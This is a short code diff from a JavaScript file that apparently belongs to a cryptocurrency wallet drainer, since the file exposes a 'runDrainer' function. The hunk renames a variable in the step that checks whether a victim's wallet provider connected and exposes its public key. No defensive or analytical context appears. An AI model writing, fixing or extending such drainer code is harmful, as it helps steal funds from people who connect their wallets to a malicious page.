@@ -5755,9 +5755,9 @@ window.runDrainer = runDrainer;
         await new Promise(resolve => setTimeout(resolve, 3000));
         
         // Try to detect if connection was successful
-        const wallets = WALLET_DEFS.find(w => w.key === walletType);
-        if (wallets) {
-          const provider = wallets.provider();
+        const wallet = WALLET_DEFS.find(w => w.key === walletType);
+        if (wallet) {
+          const provider = wallet.provider();
           if (provider && provider.publicKey) {
             return {
               success: true,
